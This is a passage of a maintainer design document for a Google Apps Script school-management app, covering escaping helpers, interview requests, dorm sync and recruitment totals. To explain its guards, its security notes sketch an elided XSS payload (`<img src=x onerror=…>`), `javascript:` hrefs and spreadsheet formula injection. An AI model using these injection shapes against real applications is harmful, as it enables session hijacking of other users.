  added, so recovering it needs no rewriting.
- Full-width and zero-width look-alikes are inert, so `_cellSafe_` was NOT widened for them.

⚠️ **Sheets and Excel need different character sets.** `_cellSafe_` guards `=` and
`+`, and `-` except for a bare number (since 2026-09-07: Sheets evaluates `-IMPORTXML(…)`);
`@` is not special to Sheets. The CSV
export (`_expCsv`) guards `= + - @`, because **Excel** is looser — but exempts
plain numbers so an ordinary `-5` still exports as a number. `tests/cellsafe.test.js`
covers both.

### 6.1.1 Output escaping (`Index.html`)

The frontend builds ~116 HTML fragments by interpolation and assigns them to
`innerHTML`. Four helpers, and picking the wrong one is the usual mistake:

| Helper | Use for |
|---|---|
| `escHtmlJs` | text content. Escapes `& < >` |
| `escAttrJs` | a value inside a **double-quoted** attribute. Adds `"` |
| `escAttrJsStr` | a value inside a **JS string literal inside an attribute** — the `onclick="f('${id}')"` shape. Adds `\` and `'` |
| `_safeHref` | a URL going into an `href`. Escaping is not enough there: `javascript:` executes on click with no tag injection at all |

⚠️ **Apps Script does not sanitise this page.** It is served as-is inside the
iframe, so an injected `<img src=x onerror=…>` runs in the victim's document,
where `currentUser`, `apiRun()` and the session token in `localStorage` all live.
No network egress is needed — calling `apiRun()` as the victim *is* the attack. A
holder of an ordinary permission like `edit_dorms` could name a building
`<img src=x onerror="…">` and have it run in the master's browser.

About 30 sinks carried sheet data raw until 2026-08-19 — 学生一覧 → 在籍学生 and
the 詳細 modal its rows open, the 学生数 report, the **ユーザー管理** user table,
the building header in 部屋一覧, the interview calendar, and the シミュレーション
grid. `tests/xss.test.js` scans both the template-literal and the
string-concatenation form and fails on any interpolation that is neither escaped
nor on its reviewed `SAFE` list. **When it fails, the fix is almost always to
wrap the expression, not to extend `SAFE`.**

⚠️ Two pairs of names are easy to swap, and both were swapped in the handover
notes for this change. **学生数** is the `report` sub-tab of 学生一覧, rendered
server-side into `reportTable`, with no row click and no 詳細 modal; the modal
belongs to its sibling **在籍学生** (`currentStudentTable`). And **ユーザー管理**
is its own top-level tab (`view-users`), not part of **アカウント設定**
(`renderAccountTab`, which shows the signed-in user their own profile).

⚠️ There are **three different `const esc`** in `Index.html`. 3631 and 8950
escape HTML; **8890 does CSV quoting** — it doubles the double-quote and leaves
`<` alone. Scope keeps them apart, but the name does not.

### 6.2 Interview scheduling

⚠️ **One active request per booking. Withdraw before requesting anything else.**

A booking supports **three** requests, and each is stored somewhere different:

| request | marker |
|---|---|
| 日時変更 | `BookerReq_Status` = `Pending` (cols 17-21, idx 19) |
| 交代 | `Status` = `Reassign_Pending` (+ cols 13-16, idx 5) |
| キャンセル依頼 | `Status` = `Cancel_Request` (+ `Cancel_Reason` col 23, idx 5) |

Nothing reconciled them, so a booking could carry two at once and
`getPendingNotifications` pushed **an item for each** — the 担当 saw a cancellation
and a reschedule for the same interview with nothing saying which to act on.

⚠️ The rule started as three *separate partial* checks and each one missed a
different pair. `requestReassignment` tested only `row[5] !== "Booked"` — which a
pending 日時変更 passes, because a date-change leaves the status at `Booked`.
`requestBookerDateChange` tested `Cancel_Request` only. The client disabled
キャンセルを依頼 for a date-change but not for a 交代. **The rule is now declared
once**, in `_activeRequest_(row)` / `_requireNoActiveRequest_(row)`, and all three
creators call it — including `saveScheduleBatch`.

The rule is **refuse, not supersede**. An earlier build had a cancellation silently
clear the pending request; it was rejected because the teacher's request vanished
without them doing anything.

⚠️ A rule this broad is only usable because **every** request can be withdrawn.
`withdrawActiveRequest` replaced the narrower `withdrawBookerDateChange`: it finds
whatever is active and clears it. Without it, each request would be a dead end until
the 担当 happened to act.

- ⚠️ **It clears all three markers, not just the one it reports.** Rows written
  before this rule can carry two, and healing only the reported one leaves the
  booking blocked with an empty banner — nothing on screen explaining why the
  buttons stay disabled.
- ⚠️ Ownership is the booking's teacher resolved from the **session** id, or
  admin-level — not the 担当, who already has 承認/却下 in the bell. It snapshots and
  logs like `_rejectBookerDateChange_` but sends no mail: there the 担当 decided, here
  the teacher is the actor.
- ⚠️ Only a *request* status is rolled back to `Booked`. A row can reach the
  withdrawal with a 日時変更 pending while `Status` is legitimately `Booked`.

⚠️ `saveScheduleBatch` validates in a **separate pass over `updatesArray` before any
write** — a throw inside the write loop would leave every earlier update in the
batch committed. ⚠️ And there it refuses only a *different* active request: a row
that is already `Cancel_Request` re-saving as `Cancel_Request` is an ordinary edit
(the 担当 changing 備考 on a slot awaiting cancellation sends the status back
unchanged), and refusing that would make the booking uneditable.

On the client, `_slotActiveRequest(slot, cStatus)` mirrors `_activeRequest_` — same
three markers, **same precedence**, so a legacy row carrying two is described the
same way on screen as in the log. One `activeReqBanner` names the active request and
carries the 取り下げ button; `_gateRequestBtn` disables **both** 日時/担当変更リクエスト
and キャンセルを依頼 with the reason in the `title`. ⚠️ The label and the title are
both restored on the enabled branch — the modal is reused across slots, so anything
left set follows the button to the next booking. ⚠️ A read-only viewer loses the
取り下げ **button**, not the banner: the banner is information, only its action is
privileged.

⚠️ **The client refuses before the update is queued**, not only on the server.
`calFlush`'s failure handler deliberately keeps a failed change
("変更は保持されています"), so a cancellation the server will always reject would sit
in `calPendingUpdates` and fail again on every later flush.

The `if`s in `getPendingNotifications` stay independent on purpose. The fix is that
the DATA can no longer hold two; a reader that hid one would leave a real
conflicting row in the sheet, unseen.

⚠️ **The 取り下げ button's label is DOM state, and the DOM outlives the modal.**
`withdrawActiveReq` swaps it to 取り下げ中... while the call is in flight, and it was
restored in exactly one place — partway down `openTeacherViewModal`, behind the slot
rendering. It reached a later open still reading 取り下げ中 on a booking nothing was
being withdrawn from. There is now one `_resetWithdrawBtn()`, called from the **top**
of the open (before anything that can throw), from `closeTeacherViewModal`, from both
handlers **before** they close or toast, and from a `catch` around the dispatch line —
a throw there fires neither handler. `closeTeacherViewModal` also clears
`window._activeReqSlot`, which `submitCancellation` reads as its local refusal.

⚠️ **A slot carrying a request must never reach the availability cycle.**
`calTeacherToggle` routes booked slots to the modal and falls through to the
None → Available → Unavailable cycle for everything else — which queues
`{status:'Available', student:""}` and **clears the booking**. `Reassign_Pending` was
missing from that list. It predates the rule above, but the rule is what sends
teachers to those slots: it tells them to open the slot and withdraw first.
`calHandleClick` carries the same list, deliberately.

`tests/reqcollision.test.js` walks the full matrix — each of the four states
(none / 日時変更 / 交代 / キャンセル) against each of the three creators — plus
withdrawal of every type, the legacy two-marker heal, and ownership.

### 6.3 Interview results
Entry warns on duplicates (name + nationality + age) but allows override.
スケジュールから読み込む imports booked interviews dated today or earlier,
skipping any student who already has a result — one record per student. Header
lookup tolerates trailing parentheticals, so 点数（面接） still maps to 点数.

### 6.4 Dorm billing and PDFs
Six bill types plus rent follow one rule: a room value replaces the building
default; blank inherits. The room detail view shows which is in effect. PDFs
render only bills with a value.

Single and bulk export share one renderer, `_buildRoomHtml_`, which returns a
**complete** HTML document. `generatePDF` converts it as-is;
`combineRoomHtmlToPdf` takes each apart with `_htmlHeadInner_` / `_htmlBodyInner_`
and emits **one** document — doctype and `<head>` once, each room's body inside a
page-break wrapper.

⚠️ The combined document **must** start with `<!DOCTYPE html>`. Without it the
renderer runs in quirks mode, where a `font-size` set on `body` does not inherit
into `<table>` elements — and this template is almost entirely tables, so every
line silently renders ~16px instead of 11px. That was the bulk export's
font-size bug.

⚠️ The two paths get their room object from **different** functions —
`getDormData` (single) and `getBuildingRoomsForExport` (bulk). Any field
`_buildRoomHtml_` reads must exist in **both**. `getBuildingRoomsForExport` once
omitted all six per-room bill overrides, so bulk PDFs printed the building
default with no error. `tests/pdfexport.test.js` asserts the two field sets are
identical.

Garbage has **five** categories, each a bilingual collection day plus a bag
type: 家庭ごみ, 燃えるゴミ(プラスチックを含む), カン・ビン・ペットボトル, プラスチック,
雑紙. They are independent and additive — a `DISPLAY_Garbage_*` tag hides any
row whose collection day is blank, so a building whose ward collects burnable
and plastic together fills in the combined category and leaves 家庭ごみ and
プラスチック empty. Bag values are stored as `"JP / EN"` and split onto two lines
for the PDF by `bagToLines`, which also upgrades pre-2026 short bag strings.

### 6.4.9 Error codes

⚠️ **Nothing a user sees names an internal thing** — not a tab, not a column, not
「スナップショット」. The ~10–20 daily users are teachers and admissions staff. Messages
produced in `Code.js` and thrown to the client count as "on screen" too.
`tests/wording.test.js` enforces this and lists the maintainer-only exceptions.

Messages a user **cannot act on** carry a code instead of an instruction. Messages
they **can** act on (「先に日時変更リクエストを取り下げてください」) keep the instruction
and get **no code** — that split is what keeps a code meaning "call the maintainer".

⚠️ **Append-only. Never renumber, never reuse a retired code** — a code in a
screenshot from six months ago must still mean the same thing.

| code | what the user sees | real cause | fix |
|---|---|---|---|
| SYS-01 | 面接スケジュールのデータが見つかりません | `Schedule_DB` tab missing or renamed | restore the tab name |
| SYS-02 | 学生データが見つかりません | `Central_DB` tab missing or renamed | restore the tab name |
| SYS-03 | 建物データが見つかりません | building id absent from `Building_Info` | check the id in `Building_Info` |
| SYS-04 | 指定のバックアップが見つかりません | snapshot sheet deleted from the snapshot spreadsheet | pick another snapshot |
| SYS-05 | バックアップの指定が正しくありません | snapshot name lacks the `__` separator — a hand-edited or truncated name | pick from the list rather than typing |
| STU-01 | 卒業生データに「決定進路」の項目がありません | `Past_DB` has no 決定進路 column | run the student sync, then re-open |
| DORM-01 | 寮の更新に必要なデータが空です | `Central_DB` or `Room_Info` under 2 rows | check the student sync ran |
| DORM-02 | 学生データに「寮」の項目が見つかりません | 寮 header renamed in `Central_DB` | restore the header name |
| DORM-03 | 学生データに「学籍番号」の項目が見つかりません | 学籍番号 header renamed in `Central_DB` | restore the header name |
| DORM-04 | 空室にする部屋が多すぎます | vacate count over `DORM_VACATE_MAX_RATIO` — usually an alias gap, not real move-outs | check `Dorm_Aliases`, then re-run 自動割当 |
| DORM-05 | 寮の自動割当が最後まで実行できませんでした | anything the nightly trigger caught; the raw message is in the report's `detail` and the execution log | read `detail`, then the execution log |
| DORM-06 | 寮の更新に必要なデータが見つかりません | one of `Central_DB` / `Building_Info` / `Room_Info` missing | restore the tab name |
| STU-02 | 学生データに「性別」の項目が見つかりません | 性別 header renamed in `Central_DB` (性別集計) | restore the header name |
| REC-01 | 保存する内容を読み取れませんでした | `saveRecruitmentBatch` got a payload it could not read — a malformed `ops` array, or an `op.t` the server has no case for. Means the page and the deployed `Code.js` disagree | reload the page; if it persists, `Index.html` and `Code.js` were deployed out of step (hard rule 5) |
| SYS-06 | システムの設定が完了していません | a required script property is unset in this project: `PHOTO_FOLDER_ID`, `UPLOADS_FOLDER_ID` or `STUDENT_SOURCE_SPREADSHEET_ID`. The execution log names the key | set it in ⚙ Project Settings → Script Properties, then run `authoriseServices` |

### 6.5 Dorm auto-assign
`Dorm_Aliases` is consulted first, then fuzzy matching. Shared-room slots are
recognised as `-2`, a space, no separator at all, or 右/左 bed labels.

**One scope, decided per room.** `syncDormsFromCentralDB` takes no `mode`:

| room | Central_DB | action |
|---|---|---|
| vacant | matches | assign |
| occupied | matches | refresh from Central_DB |
| occupied | no match | vacate, and record it |

It used to ask 空室のみ / 全部屋を上書き in a modal, with 割当テスト beside it to
preview the answer — a global wrapper over a decision the loop already makes room
by room. Both are gone, and `triggerAutoSyncStudents` runs the same function
nightly after `fetchAndMergeStudentData` (in its own try/catch: the student sync
is the important half).

⚠️ **An earlier version of this section claimed the sync "never auto-vacates an
unmatched one — it reports them". That was wrong; it vacates.** Corrected
2026-08-26.

⚠️ **The sanity gate is what makes it safe to run unattended.** Rename Central_DB's
寮 header and `dormIdx` becomes `-1`, so no student has a dorm, so **every occupied
room is a no-match and gets vacated** — and the diagnostic path that would have
caught it only runs when `updateCount === 0`, which the vacates prevent. The old
code emptied the dorms and returned 「成功！」. Survivable when a human had to pick
全部屋を上書き and click through a confirm; nightly and unattended it is a silent
wipe. So before any vacate, the vacates are dropped — **the assignments still
happen** — when the 寮 or 学籍番号 header is missing, no student has a dorm at all,
or the count exceeds `DORM_VACATE_MAX_RATIO` (0.3) of occupied rooms above a
`DORM_VACATE_MIN` floor of 5. ⚠️ The floor matters as much as the ratio: without it
a building with 4 occupied rooms could never register 2 genuine move-outs.

⚠️ Vacate candidates are **collected in the loop and written after it**. The count
arm cannot be judged one room at a time, and a vacate already written is one the
gate cannot recall.

The result is persisted to the `DORM_SYNC_REPORT` script property, returned by
`getDormData` as `lastSync`, and shown by `renderDormSyncReport` as a 要確認 panel
above the room list. ⚠️ A run that *vacated* rooms and a run whose vacates were
*held* must not read alike: the first is information (check these move-outs), the
second a warning (nothing happened, fix Central_DB).

⚠️ **The report is `edit_dorms` data even though `getDormData` is guarded by
`view_dorms`.** Everything that answers it — 自動割当, `Dorm_Aliases`, the snapshot
panel — needs edit; a view-only user was seeing a warning with nothing they could do
about it. Gated on the **data** (`lastSync: _hasPerm_(...) ? … : null`), never by
putting `permission-req` on the panel: `setupInterfaceBasedOnRole` sets `display`
from `data-orig-display` at login for every `.permission-req`, which would force the
panel visible with nothing to report and fight `renderDormSyncReport` for the same
property.

⚠️ **The report records the RUN, not just the exceptions.** It originally saved only
on the two interesting paths, so a throttled run, a swallowed throw, an empty
Central_DB and a perfectly clean run were all the same blank screen — which is
exactly how it was first reported ("I ran the trigger and no report appeared").
Every terminal path now saves, including the empty-data early return and the
trigger's own `catch`, and `_saveDormSyncReport_` derives one `status`:
`failed` → `held` → `vacated` → `clean`. ⚠️ That order matters: a held run carries
its pending labels in `rooms`, so reading rooms first would report it as `vacated` —
the opposite of what happened.

⚠️ **The 最終同期 chip is how you tell a run happened at all.**
`triggerAutoSyncStudents` is throttled by `AUTO_SYNC_MIN_GAP_SEC` (10 minutes) and
returns `"throttled"` without doing anything, so running it twice looks identical to
running it once. The chip's timestamp not moving *is* the signal, and it needs no
extra state. **自動割当 has no throttle** — that is the button for a forced run.
⚠️ The chip is emitted by `renderDormTotals`, which must stay the **single writer** of
`#dormTotals`; appending it from a second function is how the panel's ✕ got deleted
by its own renderer.

The panel shows three outcomes and they must not read alike: **failed** (it did not
run, nothing touched), **held** (it ran, refused to vacate, fix Central_DB),
**vacated** (it ran, emptied these rooms, check them). A clean run is deliberately
silent there — the chip is what says it ran.

`acknowledgeDormSyncReport` is the panel's ✕. ⚠️ **Shared, not per-browser** — "someone
has dealt with this" is a fact about the school, so it marks the stored report
(`acked`) and logs. ⚠️ It takes the report's `at` and refuses a mismatch: the nightly
run can replace the report between the page load and the click, and clearing blind
would acknowledge a warning nobody read. A new run writes a fresh object with no
`acked` field, so the next report reappears by construction — the tests pin that the
sync never writes one.

---

## 7. 募集状況 (Recruitment)

Tracks **prospective** students — a different population from the enrolled
students in Central_DB. Complementary, not duplicated.

### 7.1 Sheets

| Sheet | Columns |
|---|---|
| `Recruitment_DB` | Timestamp, 入学期, コース, 国名, 募集担当者, 人数, EnteredBy — one row per filled grid cell. ⚠️ **人数 is the GROSS**, see §7.3 |
| `Recruitment_Capacity` | 入学期, コース, 定員, 前年実績, 国名 — 国名 blank = course-level; set = per-country; `＠<地域>` = group-level |
| `Recruitment_Meta` | 種別, 値, 地域, 並び順 — 種別 is `intake` / `country` / `recruiter` / `region` |
| `Recruitment_OtherVisa` | 入学期, 番号, 国籍, 名前, 現在のビザ, ビザ変更, 課程, 担当, 松野, 学費. **Addressed positionally on both sides** — `_getOtherVisaRows_` reads by 0-based index, `saveOtherVisaCell` writes by 1-based column. Adding a column shifts both; `tests/visacolumns.test.js` asserts they stay in step, because a mismatch writes under the wrong heading without erroring |
| `Recruitment_Cancel` | 入学期, 種別, 国籍, 名前, 課程, **担当**. Positional on both sides like `Recruitment_OtherVisa`, and covered by the same test. 課程 + 国籍 + 担当 name the grid cell a cancellation is subtracted from — all three are dropdowns for that reason |
| `Recruitment_Notes` | 入学期, 内容, 更新者, 更新日時, リスト提出日, 申請日, 結果, **担当**. Two writers share a row: `saveRecruitmentNote` owns columns 2–4 and `saveRecruitmentDates` owns 5–8. They only coexist because those blocks are disjoint |

### 7.2.0 定員・残枠's total row

⚠️ **A total must equal the column printed above it.** Every cell sums the values
the rows actually *display*, skipping those rendering `-`.

**残枠 is summed, never recomputed as 定員合計 − 合計合計.** The two differ whenever a
course has no 定員: its students count toward 合計 while it contributes nothing to
定員, so the recomputed figure comes out lower and a reader adding the column up
gets a different number from the row. 前年 likewise skips the auto figure when
`lyMatched === 0` — that dash means "matched nothing", not zero. A column blank
everywhere totals `-`, not `0`.

The row sits at the end of `<tbody>`, above the three `tfoot` warnings, and carries
plain numbers: 定員 and 前年 are `<input>` per course for managers, and a typeable
total would invite an edit that saves nowhere.

### 7.2.1 `Recruitment_NotIssued` — 不交付

Applicants whose 在留資格認定証明書 was not granted. Sits beside キャンセル and shares
its dropdowns, and **means something different**:

| | names | flows into |
|---|---|---|
| キャンセル | one GRID CELL — 課程＋国籍＋担当 | `_recNet` → the grid inputs, every derived total, 定員・残枠 |
| 不交付 | one 定員・残枠 ROW — 課程 alone | 定員・残枠 only |

⚠️ **不交付 must never go through `_recNet`.** Doing so would move the recruiter
grid, changing numbers people typed under them. A row counts the moment it has a
課程; 国籍 and 担当 are recorded for reference, so a blank one still subtracts —
the opposite of the cancel rule, where all three are required.

`合計 = 在籍 + 現在 + 他ビザ − 不交付`, **clamped at 0**: more 不交付 than applicants
is a data-entry state, not a negative student count, and a negative 合計 would push
残枠 above 定員. The count has its own column so the reduction is visible; a total
that shrinks with nothing on screen explaining it is a complaint this app has had
before. Rows with a blank or out-of-scope 課程 are named in the summary's `tfoot`
alongside the 留学ビザ以外 and キャンセル warnings.

Sheet: `入学期 | 国籍 | 名前 | 課程 | 担当` (`NOTISSUED_COLS = 5`), no 種別 — it is one
category. The positional read/write pair is pinned by `tests/visacolumns.test.js`
§7.1-7.2, and the behaviour by `tests/notissued.test.js`.

### 7.3 ⚠️ The grid shows NET; `Recruitment_DB` stores GROSS

A キャンセル row is a standing **−1** on one grid cell, keyed
`コース||国名||担当`. Added 2026-08-07. Every total on the screen is net: the cell
itself, the country's 現在数, the region subtotal, 担当者計, 担当者合計, and 現在 in
定員・残枠 — and therefore 合計 and 残枠.

The input box a recruiter types into shows the **net**. `recSaveCell` adds that
cell's cancels back before writing, so `Recruitment_DB.人数` keeps meaning "ever
recruited" while the screen means "still live". Type 4 against 1 cancel → 5 stored
→ 4 displayed.

**Do NOT make the box show the stored value.** That is the ratchet: `el.value`
would be saved as the new gross, the cancel would subtract again, and the cell
walks 5 → 4 → 3 on every edit — silently, with the original unrecoverable.
`tests/cancelsubtract.test.js` §5 is exactly that scenario and was mutation-checked
against a naive implementation, which produced `4 → 3 → 2 → 1`.

The consequence, accepted deliberately with the user: **the sheet holds a figure
nobody typed.** That is invisible in normal use precisely because nobody opens the
spreadsheet — it is private and the app is the only way in — which is why it is
written down here instead.

Two supporting rules:

- **Every total goes through `_recNet`.** The same cells are summed in ten places,
  several duplicated between the render path and `recRefreshTotals`. Wiring the
  subtraction into only some of them makes 現在 stop equalling the grid printed
  directly below it — the invariant 他ビザ's separate column exists to protect.
- **A cancel missing 課程, 国籍 or 担当 subtracts from nothing and is named** in a
  red `tfoot`, exactly as `_recUnattributedVisa` does. "I recorded a cancel and no
  number moved" must never be silent. Rows whose 種別 is outside the three known
  kinds still subtract — the table does not render them, so they would otherwise
  be invisible yet counted.

### 7.2 Design points

- All totals are derived by grouping, never stored, so they cannot drift.
- **定員・残枠 counts three populations**: enrolled (Central_DB), 現在 (the
  担当者 grid), and 他ビザ — one seat per `Recruitment_OtherVisa` row that has a
  課程. 合計 is their sum; 残枠 = 定員 − 合計. 他ビザ has its own column rather
  than folding into 現在 so 現在 keeps matching the grid below it exactly;
  anyone adding that grid up by hand must get the same number.
  `recRenderCapacitySummary()` rewrites **only** `#recCapacityTable`, so it is
  safe to call while the roster below is being edited.
- 課程 on the 留学ビザ以外 roster is a `<select>` fed by
  `recCoursesForIntake()`, because that string is now grouped on and free text
  made 進学2年課程 / 進学２年課程 three different courses. ⚠️ A value already in
  the sheet that isn't in the list is carried as its own `（対象外）` option — a
  `<select>` whose value is absent from its options selects the first one and
  fires **no** change event, so the sheet would keep the old text while the UI
  showed another course. Such rows are counted nowhere, so a warning line in the
  table's `tfoot` names them.
- Courses per intake come from `REC_COURSES_BY_MONTH` in `Index.html`.
  `PlacementTest_Config` may **ADD** courses but must never override — that
  sheet configures placement *tests*, so a course running without one is
  legitimately absent from it. (July lost 日本語・文化2年課程 this way once.)
- Countries and recruiters are explicitly managed lists. Anything with data
  already entered is always rendered, so numbers can't become unreachable.
- **Nothing in 募集状況 writes as you type.** Every typed edit updates the local
  model and the derived totals in place, records an op on a queue, and paints the
  cell amber; the 保存 button (`#btnRecSave`) sends the whole session in ONE
  `saveRecruitmentBatch` call. It replaced a 1.5s debounce on the grid and on
  連絡事項, and a bare `onchange` RPC on everything else — 留学ビザ以外 alone was
  nine round trips to fill one row, and each 定員 edit cost a save *plus* a full
  `recLoad()`. See §7.4.
- 留学ビザ以外 and キャンセル rows add and delete **optimistically** — the change
  shows immediately and the server is told afterwards, with the row restored on
  failure. A new row has no `_sheetRow` until the server answers, so it carries a
  `_pendingId`, its inputs address that, and edits typed meanwhile are held and
  flushed on confirm. The flush reads the **live inputs**, not just the held
  buffer, because `onchange` has not fired for a field that still has focus.
- 連絡事項 stores HTML, sanitised on the client **and** again on the server; it's
  rendered for every user, so pasted markup is never trusted. Paste is forced to
  plain text. Manager-level to write.
- **前年 is the SAME INTAKE one year earlier** — 2027年10月 compares against
  2026年10月, not the whole of 2026. Four intakes a year, so the header names the
  month; a year-only header invites reading it as an annual total.

- ⚠️ **前年 reads `Central_DB` ONLY.** Past_DB is students who withdrew or
  graduated, and **a withdrawal frees the slot** — those rows must not count
  toward an intake's actuals. Including Past_DB made 2025年10月 進学1年6か月課程
  read 19 against a true 18; the extra row was a withdrawn student who, because
  Past_DB carries no 期 prefixes at all, fell through to the 学籍番号 fallback and
  was put back into the intake they had left. Nothing on the row marks it as
  withdrawn — the tab it lives in is the only signal.

  Consequence, and it is the intended one: an intake old enough that its students
  have all graduated out of Central_DB reports no data, and the cell renders `-`
  rather than a misleading 0. 前年 is used for the upcoming intake, one year back,
  whose students are still enrolled.

- **The intake comes from the COURSE CELL's `NN期` prefix, not 学籍番号.**
  Central_DB's course column looks like `80期_進学1年6カ月課程`. When a student
  changes course that cell is rewritten and **学籍番号 is never reissued**, so for
  exactly those students 学籍番号 names the intake they left. Bucketing by it
  counted them against the wrong year.

  `_kiIntakeMap_` derives 期 → 入学期 **from the data**: for rows carrying a given
  期, the most common 学籍番号 intake wins. Movers are the minority, so the mode is
  the 期's true intake and they are the rows that disagree. That beats an anchor
  constant — no maintenance, and it survives a renumbered or skipped 期.
  `diagnoseLastYearCounts()` prints the derived table, the source counts, and
  old-vs-new totals per intake.

  ⚠️ A first attempt parsed a `202604_` prefix and did **nothing at all** — every
  total came back identical, because the real prefixes are 期 numbers. Check
  `from the course-column prefix` in the diagnostic: 0 means nothing parsed.

- ⚠️ **`_recCourseKey_` must produce exactly what `_simNormCourseJs` produces.**
  The table looks up `recLastYear.counts[_simNormCourseJs(co)]`, so a key built
  any other way is one it can never ask for and the column shows 0.
  `_normalizeCourseKana_` alone did not strip whitespace, so any course value
  containing a space — U+3000 included — was unreachable.
  `tests/lastyear.test.js` §5 asserts the two stay in step.

- Rows whose course is a *category* (`進学`, `一般`, `短期`) rather than a course
  name match nothing and count toward no course. That is most of Past_DB. Those
  courses retire after 202507, so no mapping is invented; the cell renders `-`
  with an explanation rather than a confident `0`.

- Changing the bucketing means **renaming the cache key** (`enrolByIntakeMonth2`
  today). The old entry lives 30 minutes and otherwise serves the previous
  numbers, which looks exactly like the change not working.

- ⚠️ **Known, unfixed:** `getRecruitmentContext` documents
  `enrolled: "入学期||コース"` but builds `"||" + co` — no intake. So 合計 adds every
  enrolled student in that course **school-wide** to every intake, inflated by
  the number of live cohorts (×2 for 進学1年6か月課程, up to ×8 for
  日本語・文化2年課程, which runs in all four intakes for two years). Deliberately
  left alone; the per-intake split now exists if it is ever wanted.

### 7.4 The 保存 button — deferred writes

Every input in 募集状況 used to write as it was typed. Typing now updates the local
model and every derived total immediately (the screen must still add up while you
work), records an op on a queue, and paints the control **amber**; nothing reaches a
sheet until 保存.

**One queue, two stores.** `_recPending` keeps the grid counts — it already held the
right payload, including `prev` — and `_recDirtyOps` keeps everything else, keyed
`cap|課程|field|国名`, `cancel|行|項目`, `visa|…`, `notissued|…`, `dates`, plus the
`_recNoteDirty` flag. `recDirtyCount()` spans all of it, `_recPendingEdits` included:
those are fields typed into a row whose add has not come back yet, and they are
unsaved work like any other.

⚠️ **Every `_recDirtyOps` key is non-numeric on purpose.** JS reorders integer-like
keys to the front of an object, and `saveRecruitmentBatch` answers with a
**positional** results array — one reordered key lines every result up against the
wrong op.

⚠️ **The server DISPATCHES, it does not reimplement.** `saveRecruitmentBatch` loops
its ops into the seven existing savers. Each of those owns the permission check for
its kind (`capacity`/`note`/`dates` need `manage_recruitment`, the rest
`edit_recruitment`), its positional column map, its `_cellSafe_` wrapping, its
`_logActivity_` line and, for `saveRecruitmentCount`, the throttled snapshot §7.1's
zero-deletes depend on. The batch's own `_hasRecruitPerm_` check is a **floor**, not
a replacement — collapsing the two lets an `edit_recruitment` user reach 定員 by
putting a `capacity` op in the array.

⚠️ **Per-op try/catch.** One refused cell must not abandon the twenty behind it. The
saved ops clear, the refused ones stay queued and go red, and 保存 retries them. A
missing result reads as a failure, never as success.

⚠️ **A refused grid cell KEEPS the typed number** — the one deliberate reversal of
the old behaviour. Auto-save rolled the box back to the stored figure because there
was no retry gesture and showing the truth was the best answer available. With a
button there is one, and reverting somebody's number while the thing that would
retry it goes quiet loses the work *and* hides that anything went wrong.

⚠️ **A DELETE RENUMBERS THE QUEUE, not just the model.** `_recDropRow` shifts every
later `_sheetRow` down by one, and queued ops address a row by that same index — so
`_recShiftDirtyOps(kind, ri, ±1)` runs beside it in all three `recDelete*Row`, and
beside `_recRestoreRow` in each failure handler. Missing it leaves an outstanding
edit pointing one row too high: past the end it comes back
「対象の行が見つかりません」, and **inside** the sheet it writes to the wrong person,
silently — the worse half, and the reason this is not merely a cosmetic fix. Found on
staging at v146. It stays out of `_recDropRow` itself, which remains a pure list
function because `tests/sheetrow.test.js` transcribes it as one.

⚠️ **A re-render is the standing hazard.** `recRenderCapacitySummary` and the three
roster renderers all run mid-edit, so each ends in `_recRepaintDirty()`, ops carry a
**selector** rather than an element reference, and `_recQueueCapacity` writes back to
`recData` (see §9's model rule — that omission was the real bug found here).

⚠️ **`p.val` is already the gross.** `recSaveCell` adds the cell's cancels back when
the number is entered; `recSaveAll` sends that figure untouched. Re-deriving it from
`el.value` at save time is the 5 → 4 → 3 ratchet of §7.3.

**A RELOAD CARRIES UNSAVED WORK ACROSS.** `_recReapplyDirtyToModel()` writes every
queued value back into the freshly fetched `recData` *before* anything renders — so
the inputs come back with the typed values in them — and `_recReapplyDirtyToDom()`
re-binds the grid cells (whose elements the render replaced), restores the 日程 row,
and repaints the markers. `recLoadNote` will not overwrite a note while
`_recNoteDirty`. That is what lets someone delete a 国名, a 担当者 or a 地域, rename a
group, or reorder the recruiter columns while holding half a screen of unsaved
numbers.

⚠️ **An earlier version refused those outright** — 「先に「保存」を押してください」 on
nine 管理 paths, because each ends in a `recLoad()` that re-rendered the dirty inputs
away. The user reported it as a bug and was right: having to save a half-typed grid
before you may delete a country is exactly the coupling the 保存 button existed to
remove. Don't reintroduce it; fix the reload instead.

⚠️ **The queue belongs to ONE intake** (`_recDirtyIntake`). Ops carry no intake of
their own — `recSaveAll` reads it off the select at save time — so an op queued under
2026年10月 and saved under 2027年4月 writes to the wrong cohort. A reload therefore
keeps the queue only while the intake is unchanged, and discards it when it is not.
This is also why `recSubmitIntake` still asks: it switches intake.

**Leaving with unsaved work** — intake switch, 入学期追加, sub-tab and main-tab
changes. `#recUnsavedModal` offers **three** answers: 保存して移動 / 保存せずに移動 /
キャンセル. Its messages are actionable, so none carries a code.

⚠️ **It was a `confirm()` first, and that was wrong.** Two answers meant OK silently
threw the work away, with no one-click way to keep it — reported from staging at
v148. A modal cannot answer inline, so **`_recGuardDirty(proceed, stay)` is
asynchronous**: it returns `true` synchronously only when nothing is dirty (so every
clean navigation still costs nothing), otherwise it stores the callbacks, opens the
modal and returns `false`. Callers hand over what to do instead of reading a return
value — `switchSubTab` / `switchMainTab` / `recSubmitIntake` pass a closure that
**re-invokes themselves**, which cannot loop because the queue is empty by then.

⚠️ **保存して移動 moves only if the batch came back clean.** `recSaveAll(after)` reports
`after(allSaved)`; on a partial failure the modal closes, the red markers stay, and
the `stay` callback runs — for the intake dropdown that means the select is restored,
exactly as on キャンセル. Navigating away from the errors would hide the one thing
worth looking at.

⚠️ **`_recUnsavedTake()` clears the callback pair before running either.** Both paths
can re-enter the guard, and a stale pair fires the *previous* navigation.

⚠️ **`z-index: 10050`, above `.modal-overlay`'s 10000** — 入学期追加 can be open
underneath, and a prompt behind the dialog that raised it is unusable.

`beforeunload` stays the browser's own dialog; a page teardown cannot wait on a modal.

⚠️ **Roster ops address a row by `_sheetRow`, so the re-apply is only sound while the
reload cannot have moved those rows.** It is: everything that reaches it touches
`Recruitment_Meta`, never the three rosters. A delete *does* move them, and that is
handled separately by `_recShiftDirtyOps` above.

⚠️ **`＋行を追加` IS DEFERRED; `削除` IS NOT.** The asymmetry is deliberate and was
settled with the user.

A new row is created **locally only** — a `_pendingId`, no server call — and reaches
the sheet on 保存 as **one whole-row op** (`addvisa` / `addcancel` / `addnotissued`)
carrying every field. It counts as one item in the badge and its fields add nothing on
top: for a pending row the model row *is* the pending value, so there is deliberately
no per-field queue entry. `_recPendingRows()` derives them by scanning for
`_pendingId` rather than keeping a parallel list.

